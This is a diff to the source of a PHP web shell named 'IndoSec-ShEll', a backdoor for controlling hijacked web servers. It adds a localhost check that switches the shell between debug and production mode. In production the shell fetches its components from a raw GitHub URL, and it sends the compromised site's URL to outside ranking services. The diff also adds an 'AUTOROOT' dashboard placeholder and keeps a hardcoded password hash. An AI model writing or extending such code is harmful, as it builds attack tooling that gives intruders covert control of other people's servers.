@@ -58,7 +58,8 @@ if (@function_exists('ini_set')) {
 /* Configurasi */
 $aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
 $_SESSION["password"] 	= $aupas;
-$mode					= "prod";
+$isLocal 				= ($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1']));
+$mode					= $isLocal ? "debug" : "prod";
 $BASE_URL				= $mode === "prod" ? "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main" : "http://localhost/www/percobaan/ids-shell";
 
 function curlRequest($url)
@@ -340,8 +341,8 @@ function breadcrumb($page)
 
 function template($page, $bc, $search, $replace)
 {
+	
 	getContentPage("components/header");
-	getContentPage("components/sidebar");
 	getContentPage("components/rightpanel");
 	breadcrumb($bc);
 	getContentPage($page, $search, $replace);
@@ -469,7 +470,9 @@ function curlPostGetRankDAPA($url)
 
 function getRankDAPA() {
 	// check is running in localhost?
-	if($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) return;
+	global $isLocal;
+
+	if($isLocal) return;
 
 	$url 		= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
 	$content 	= curlPostGetRankDAPA($url);
@@ -484,7 +487,9 @@ function getRankDAPA() {
 
 function getRankAlexa() {
 	// check is running in localhost?
-	if($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) return;
+	global $isLocal;
+
+	if($isLocal) return;
 
 	$url 		= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
 	$content 	= simplexml_load_file("http://data.alexa.com/data?cli=10&url=$url");
@@ -944,6 +949,7 @@ function dashboard() {
 		"{{RANKCOUNTRY}}",
 		"{{DARANK}}",
 		"{{PARANK}}",
+		"{{AUTOROOT}}"
 	];
 
 	$arrReplace = [ 
